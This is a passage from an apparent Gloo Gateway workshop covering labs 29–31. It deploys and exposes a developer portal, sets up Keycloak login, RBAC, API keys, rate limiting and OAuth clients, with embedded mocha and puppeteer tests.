          value: /v1
        headers:
          - name: Cookie
            type: RegularExpression
            value: ".*?keycloak-session=.*"
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-portal-api
    - backendRefs:
        - name: gateway-portal-web-server
          port: 8080
      matches:
      - path:
          type: PathPrefix
          value: /v1
EOF
```

Note that we have matchers for authenticated access and unauthenticated access (public APIs).
Make sure the domain is in our `/etc/hosts` file:

```bash
./scripts/register-domain.sh portal.example.com ${PROXY_IP}
```

You should now be able to access the portal API through the gateway:

```bash,noexecute
curl -k "https://portal.example.com/v1/api-products"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal API without authentication", () => {
  it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', body: 'apiProductMetadata', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth.test.js.liquid from lab number 29"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 29"; exit 1; }
-->

Here is the expected output:

```json,nocopy
[{"apiProductMetadata":{"imageURL":"https://raw.githubusercontent.com/solo-io/workshops/master/images/bookinfo.jpg"},"description":"# Bookinfo REST API v1 Documentation\nThis is some extra information about the API\n","id":"bookinfo","name":"BookInfo REST API","versionsCount":2}]
```

You can see that no portal configuration has been found.

We'll create it later.




## Lab 30 - Deploy and expose the dev portal frontend <a name="lab-30---deploy-and-expose-the-dev-portal-frontend-"></a>

The developer frontend is provided as a fully functional template to allow you to customize it based on your own requirements.

Let's deploy it:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: portal-frontend
  namespace: gloo-system
---
apiVersion: v1
kind: Service
metadata:
  name: portal-frontend
  namespace: gloo-system
  labels:
    app: portal-frontend
    service: portal-frontend
spec:
  ports:
  - name: http
    port: 4000
    targetPort: 4000
  selector:
    app: portal-frontend
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: portal-frontend
  namespace: gloo-system
spec:
  replicas: 1
  selector:
    matchLabels:
      app: portal-frontend
  template:
    metadata:
      labels:
        app: portal-frontend
    spec:
      serviceAccountName: portal-frontend
      containers:
      - image: gcr.io/solo-public/docs/portal-frontend:v0.1.1
        args: ["--host", "0.0.0.0"]
        imagePullPolicy: Always
        name: portal-frontend
        ports:
        - containerPort: 4000
        readinessProbe:
          httpGet:
            path: /login
            port: 4000
        env:
        - name: VITE_PORTAL_SERVER_URL
          value: "https://portal.example.com/v1"
        - name: VITE_APPLIED_OIDC_AUTH_CODE_CONFIG
          value: "true"
        - name: VITE_OIDC_AUTH_CODE_CONFIG_CALLBACK_PATH
          value: "/v1/login"
        - name: VITE_OIDC_AUTH_CODE_CONFIG_LOGOUT_PATH
          value: "/v1/logout"
EOF
```

Wait for the deployment to be ready:
```bash
kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy portal-frontend
```

We can now expose the portal frontend through Gloo Gateway using a `HTTPRoute`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: portal-frontend
  namespace: gloo-system
spec:
  parentRefs:
    - name: http
      namespace: gloo-system
      sectionName: https
  hostnames:
    - "portal.example.com"
    - gateway-portal-web-server.gloo-system
  rules:
    - backendRefs:
        - name: portal-frontend
          port: 4000
      matches:
      - path:
          type: PathPrefix
          value: /v1/login
      - path:
          type: PathPrefix
          value: /v1/logout
      filters:
        - type: ExtensionRef
          extensionRef:
            group: gateway.solo.io
            kind: RouteOption
            name: routeoption-portal-api
    - backendRefs:
        - name: portal-frontend
          port: 4000
      matches:
      - path:
          type: PathPrefix
          value: /
EOF
```

<!--bash
ATTEMPTS=1
timeout 120 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://portal.example.com/v1/login)" != "302" ]]; do sleep 5; done'
timeout 120 bash -c 'while [[ "$(curl -m 2 --max-time 2 --insecure -s -o /dev/null -w ''%{http_code}'' https://portal.example.com)" != "200" ]]; do sleep 5; done'
export USER1_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user1)
export USER2_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user2)
ATTEMPTS=1
until ([ ! -z "$USER2_COOKIE" ] && [[ $USER2_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER2_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user2)
done
ATTEMPTS=1
until ([ ! -z "$USER1_COOKIE" ] && [[ $USER1_COOKIE != *"dummy"* ]]) || [ $ATTEMPTS -gt 20 ]; do
  printf "."
  ATTEMPTS=$((ATTEMPTS + 1))
  sleep 3
  export USER1_COOKIE=$(node tests/keycloak-token.js "https://portal.example.com/v1/login" user1)
done
echo "User1 token: $USER1_COOKIE"
echo "User2 token: $USER2_COOKIE"

# The user must be created (in the database) in 1.18
curl -k -H "Cookie: ${USER1_COOKIE}" -X PUT "https://portal.example.com/v1/me"
-->

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Access the portal frontend with authentication", () => {
  const cookieString = process.env.USER1_COOKIE;

  it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', headers: [{ key: 'Cookie', value: cookieString }], body: 'apiProductMetadata', match: true }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-api-auth.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
-->

You should now be able to access the portal frontend through the gateway.

Get the URL to access the portal frontend using the following command:

```bash,noexecute
echo "https://portal.example.com"
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("Authentication is working properly", function() {
  const cookieString = process.env.USER1_COOKIE;

  it("The portal frontend isn't accessible without authenticating", () => {
    return helpersHttp.checkURL({ host: `https://portal.example.com`, path: '/v1/login', retCode: 302 });
  });

  it("The portal frontend is accessible after authenticating", () => {
    return helpersHttp.checkURL({ host: `https://portal.example.com`, path: '/v1/login', headers: [{ key: 'Cookie', value: cookieString }], retCode: 200 });
  });
});
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
-->

If you click on the `LOGIN` button on the top right corner, you'll be redirected to keycloak and should be able to auth with the user `user1` and the password `password`.

Now, if you click on the `VIEW APIS` button, you should see the `Bookinfo REST API`.

<!--bash
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
-->


We can also configure some RBAC to restrict who can see which ApiProduct.

Let's apply a `PortalGroup` object:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: portal.gloo.solo.io/v1
kind: PortalGroup
metadata:
  name: rbac
  namespace: gloo-system
spec:
  membership:
    - claimGroup:
        - key: subscription
          value: enterprise
  apiProducts:
    - name: "*"
      namespace: bookinfo
EOF
```

Users are authenticated with OIDC and the JWT tokens generated contain a claim called `subscription`.

`user1` has a subscription `enterprise`, so you should still be able to see the ApiProduct in the developer portal.

But if you logout and login with `user2` with the password `password`, then you shouldn't see it anymore.

<!--bash
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

   it("logout and login as user2", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user2", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user2");
  });

  it("user2 shouldn't see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts).to.have.lengthOf(0);
  });

  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests-rbac.test.js.liquid from lab number 30"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 30"; exit 1; }
-->

Let's delete the `PortalGroup` to allow both users to access the `ApiProduct`:

```bash
kubectl --context ${CLUSTER1} -n gloo-system delete portalgroups.portal.gloo.solo.io rbac
```




## Lab 31 - Demonstrate the self service capabilities <a name="lab-31---demonstrate-the-self-service-capabilities-"></a>


We're going to demonstrate how to allow users to create their own teams and applications, subscribe to API Products and get credentials.

First, we need to configure Gloo Gateway to authenticate the requests with api keys.



You need to update the existing `AuthConfig` object to use the portalAuth authorization step:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - name: portal
      portalAuth:
        url: http://gateway-portal-web-server.gloo-system.svc.cluster.local:8080
        cacheDuration: 60s
        apiKeyHeader: "api-key"
        redisOptions:
          host: redis:6379
EOF
```



We already have a `RouteOption` referencing this `AuthConfig`.

Now let's explore the self-service workflow.

<details open>
  <summary>Using the portal frontend UI</summary>

Log into the portal with the user `user1` and the password `password`.

Go to `Teams` and create a new team called team1:

![Create team](images/steps/dev-portal-self-service/create-team.png)

Click on `DETAILS` and add the user `user2@solo.io` in your team.

![Add user](images/steps/dev-portal-self-service/add-user.png)

Create a new application called app1:

![Create app](images/steps/dev-portal-self-service/create-app.png)

Click on `DETAILS` and subscribe to the `Bookinfo REST API` API Product.

![Subscribe](images/steps/dev-portal-self-service/subscribe.png)

You can see the subscription is currently pending approval:

![Subscription pending approval](images/steps/dev-portal-self-service/pending-approval.png)

Logout and login with the user `admin1` and the password `password`.

This user has admin privileges because he's part of the `admin` group in the identity provider (keycloak).

Go to `Subscriptions`:

![Subscription pending approval admin view](images/steps/dev-portal-self-service/pending-approval-admin-view.png)

Approve the subscription and set a rate limit of 5 requests per `MINUTE`.

![Subscription approved](images/steps/dev-portal-self-service/approved.png)

Logout and login with the user `user2` and the password `password`.

Go to `Apps` and click on `DETAILS`. Because you've been added by `user1`, you can see the application.

All the team members have the same privileges. If a team member creates an API key and this key needs to be rotated while he's on vacation, another user can perform the operation.

Create an API key called `key1`:

![API key](images/steps/dev-portal-self-service/api-key.png)

It won't be displayed again. If you lose it, then you can create a new one and remove the old one later. It also allows you to rotate API keys.

Set the `API_KEY` environment variable using its value.

```,nocopy
export API_KEY=<the value displayed in the UI>
```
</details>


<!--bash
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const DeveloperPortalTeamsPage = require('./tests/pages/dev-portal/teams-page');
const DeveloperPortalAppsPage = require('./tests/pages/dev-portal/apps-page');
const DeveloperPortalAdminSubscriptionsPage = require('./tests/pages/dev-portal/admin-subscriptions-page');
const DeveloperPortalAdminAppsPage = require('./tests/pages/dev-portal/admin-apps-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;
const fs = require('fs');

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let devPortalTeamsPage;
  let devPortalAppsPage;
  let devPortalAdminSubscriptionsPage;
  let devPortalAdminAppsPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    const context = browser.defaultBrowserContext();
    await context.overridePermissions(`https://portal.example.com`, [
      "clipboard-read",
      "clipboard-write",
      "clipboard-sanitized-write",
    ]);
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    devPortalTeamsPage = new DeveloperPortalTeamsPage(page);
    devPortalAppsPage = new DeveloperPortalAppsPage(page);
    devPortalAdminSubscriptionsPage = new DeveloperPortalAdminSubscriptionsPage(page);
    devPortalAdminAppsPage = new DeveloperPortalAdminAppsPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it("user1 should see API Products", async () => {
    await devPortalAPIPage.navigateTo(`https://portal.example.com/apis`);
    const apiProducts = await devPortalAPIPage.getAPIProducts();
    expect(apiProducts.some(item => item.includes("BookInfo"))).to.be.true;
  });

  it("user1 should be able to create a Team and add user2@solo.io as a member", async () => {
    await devPortalTeamsPage.navigateTo(`https://portal.example.com/teams`);
    await devPortalTeamsPage.createTeamAndAddUser('team1', 'team1', 'user2@solo.io');
  });

  it("user1 should be able to create an Application", async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.createNewApp('team1', 'app1', 'app1');
  });

  it("user1 should be able to subscribe to an API Product", async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    await devPortalAppsPage.createSubscription('BookInfo REST API');
  });

  it("logout and login as admin1", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("admin1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("admin1");
  });

  it("admin1 should be able to approve the subscription and add metadata", async () => {
    await devPortalAdminSubscriptionsPage.navigateTo(`https://portal.example.com/admin/subscriptions`);
    await devPortalAdminSubscriptionsPage.approveSubscription();
    await devPortalAdminSubscriptionsPage.addCustomMetadata('key', 'value');
    await devPortalAdminSubscriptionsPage.setRateLimit(5, 'MINUTE');
  });

  it("admin1 should be able to add application metadata", async () => {
    await devPortalAdminAppsPage.navigateTo(`https://portal.example.com/admin/apps`);
    await devPortalAdminSubscriptionsPage.addCustomMetadata('app', 'bookinfo');
  });

  it("logout and login as user1", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com/v1/logout`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it('user1 should be able to create an API key', async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    
    // Create the API key and get its value
    const apiKey = await devPortalAppsPage.createApiKey('key1');
    
    // write API key to a file
    fs.writeFileSync('apiKey', apiKey);
  });
  
  // Use Mocha's 'after' hook to close Puppeteer
  after(async function () {
    await browser.close();
  });
});

EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests.test.js.liquid from lab number 31"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
-->
<!--bash
export API_KEY=$(cat apiKey)
-->


Try to access the API without authentication:

```bash,noexecute
curl -k "https://bookinfo.example.com/api/bookinfo/v1" -I
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API unauthorized", () => {
  it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 31"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
-->

The access is refused (403 response):

```,nocopy
HTTP/2 403
content-length: 8
content-type: text/plain
date: Tue, 17 Sep 2024 14:36:54 GMT
server: envoy
```

Now, let's try with the api key

```bash,noexecute
curl -k -H "api-key: $API_KEY" "https://bookinfo.example.com/api/bookinfo/v1"
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API authorized", () => {
  it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 200 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-authorized.test.js.liquid from lab number 31"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
-->

So, we've secured the access to our API, but you generally want to also limit the usage of your API.

We're going to apply rate limiting to the Gateway dynamically using metadata gathered by OPA.

We need to create a `RateLimitConfig` object:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: ratelimit.solo.io/v1alpha1
kind: RateLimitConfig
metadata:
  name: dynamic
  namespace: gloo-system
spec:
  raw:
    setDescriptors:
      - simpleDescriptors:
          - key: generic_key
            value: counter
        rateLimit:
          requestsPerUnit: 100
          unit: SECOND
    rateLimits:
    - setActions:
      - genericKey:
          descriptorValue: counter
      limit:
        dynamicMetadata:
          metadataKey:
            key: "envoy.filters.http.ext_authz"
            path:
            - key: "portal"
            - key: "rateLimit"
EOF
```

It applies a default limit of 100 requests per second, which is going to be overriden by the limit defined in the metadata generated by OPA (5 requests per minute).

Finally, you need to update the `RouteOption` to use this `RateLimitConfig`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: gateway.solo.io/v1
kind: RouteOption
metadata:
  name: routeoption-apis
  namespace: gloo-system
spec:
  targetRefs:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    name: bookinfo
  options:
    # ExtAuth configuration
    extauth:
      configRef:
        name: apis
        namespace: gloo-system
    cors:
      allowCredentials: true
      allowHeaders:
      - "*"
      allowMethods:
      - GET
      allowOriginRegex:
      - ".*"
    # Rate limit configuration
    rateLimitConfigs:
      refs:
      - name: dynamic
        namespace: gloo-system
EOF
```

Run the following command:

```bash,noexecute
for i in `seq 1 10`; do curl -k -H "api-key: $API_KEY" "https://bookinfo.example.com/api/bookinfo/v1" -I; done
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Access to API rate limited", () => {
  it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 429 }));
})
EOF
echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-rate-limited.test.js.liquid from lab number 31"
timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 31"; exit 1; }
-->

You should get a `200` response code the first 5 time and a `429` response code after.


Instead of using api keys, you can use oauth credentials.

To allow the Gloo Gateway portal backend to manage clients in Keycloak, we need to deploy a SPI (Service Provider Interfaces).

```bash
helm repo add gloo-portal-idp-connect https://storage.googleapis.com/gloo-mesh-enterprise/gloo-portal-idp-connect

helm upgrade -i -n gloo-system \
  portal-idp gloo-portal-idp-connect/gloo-portal-idp-connect \
  --version 0.3.0 \
  --kube-context $CLUSTER1 \
  -f -<<EOF
connector: keycloak
keycloak:
  realm: http://keycloak.keycloak.svc.cluster.local:8080/realms/portal-mgmt
  mgmtClientId: gloo-portal-idp
  mgmtClientSecret: gloo-portal-idp-secret
EOF

kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gloo-portal-idp-connect
```




We can now configure the Gloo Gateway portal backend to use it:

```bash
helm upgrade -i -n gloo-system \
  gloo-gateway gloo-ee-helm/gloo-ee \
  --create-namespace \
  --version 1.18.9 \
  --kube-context ${CLUSTER1} \
  --reuse-values \
  -f -<<EOF
gateway-portal-web-server:
  enabled: true
  glooPortalServer:
    idpServerUrl: http://idp-connect.gloo-system.svc.cluster.local
EOF

kubectl --context ${CLUSTER1} -n gloo-system rollout status deploy gateway-portal-web-server
```



We need to update the existing `AuthConfig` object to add the step to validate the Access Token before the portalAuth authorization step:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: enterprise.gloo.solo.io/v1
kind: AuthConfig
metadata:
  name: apis
  namespace: gloo-system
spec:
  configs:
    - name: oauth2
      oauth2:
        accessTokenValidation:
          jwt:
            remoteJwks:
              url: ${KEYCLOAK_URL}/realms/portal-mgmt/protocol/openid-connect/certs
    - name: portal
      portalAuth:
        url: http://gateway-portal-web-server.gloo-system.svc.cluster.local:8080
        cacheDuration: 60s
        redisOptions:
          host: redis:6379
EOF
```



<details open>
  <summary>Using the portal frontend UI</summary>

Go to `Apps` and click on `DETAILS` and create an OAuth client:

![Oauth client](images/steps/dev-portal-self-service/oauth-client.png)

Set the `CLIENT_ID` and `CLIENT_SECRET` environment variables using their values.

```,nocopy
export CLIENT_ID=<the value displayed in the UI>
export CLIENT_SECRET=<the value displayed in the UI>
```

</details>


<!--bash
cat <<'EOF' > ./test.js
const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
const DeveloperPortalTeamsPage = require('./tests/pages/dev-portal/teams-page');
const DeveloperPortalAppsPage = require('./tests/pages/dev-portal/apps-page');
const DeveloperPortalAdminSubscriptionsPage = require('./tests/pages/dev-portal/admin-subscriptions-page');
const DeveloperPortalAdminAppsPage = require('./tests/pages/dev-portal/admin-apps-page');
const KeycloakSignInPage = require('./tests/pages/keycloak-sign-in-page');
const puppeteer = require('puppeteer-extra');
puppeteer.use(require('puppeteer-extra-plugin-user-preferences')({
    userPrefs: {
        safebrowsing: {
            enabled: false,
            enhanced: false
        }
    }
}));
const { enhanceBrowser } = require('./tests/utils/enhance-browser');
var chai = require('chai');
var expect = chai.expect;
const fs = require('fs');

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 4000);
  } else {
    done();
  }
});

describe("Dev portal frontend UI oauth", function () {
  // UI tests often require a longer timeout.
  // So here we force it to a minimum of 30 seconds.
  const currentTimeout = this.timeout();
  this.timeout(Math.max(currentTimeout, 30000));

  let browser;
  let devPortalHomePage;
  let devPortalAPIPage;
  let devPortalTeamsPage;
  let devPortalAppsPage;
  let devPortalAdminSubscriptionsPage;
  let devPortalAdminAppsPage;
  let keycloakSignInPage;

  // Use Mocha's 'before' hook to set up Puppeteer
  before(async function () {
    browser = await puppeteer.launch({
      headless: "new",
      slowMo: 10,
      ignoreHTTPSErrors: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });
    browser = enhanceBrowser(browser, this.currentTest.title);
    let page = await browser.newPage();
    await page.setViewport({ width: 1500, height: 1000 });
    devPortalHomePage = new DeveloperPortalHomePage(page);
    devPortalAPIPage = new DeveloperPortalAPIPage(page);
    devPortalTeamsPage = new DeveloperPortalTeamsPage(page);
    devPortalAppsPage = new DeveloperPortalAppsPage(page);
    devPortalAdminSubscriptionsPage = new DeveloperPortalAdminSubscriptionsPage(page);
    devPortalAdminAppsPage = new DeveloperPortalAdminAppsPage(page);
    keycloakSignInPage = new KeycloakSignInPage(page);
  });

  it("user1 should authenticate with keycloak", async () => {
    await devPortalHomePage.navigateTo(`https://portal.example.com`);
    await devPortalHomePage.clickLogin();
    await keycloakSignInPage.signIn("user1", "password");
    let username = await devPortalHomePage.getLoggedInUserName();
    expect(username).to.equal("user1");
  });

  it('user1 should be able to create an OAuth client', async () => {
    await devPortalAppsPage.navigateTo(`https://portal.example.com/apps`);
    await devPortalAppsPage.navigateToAppDetails();
    
    // Create the API key and get its value
    const oauthClient = await devPortalAppsPage.createOAuthClient();
    
    // write API key to a file
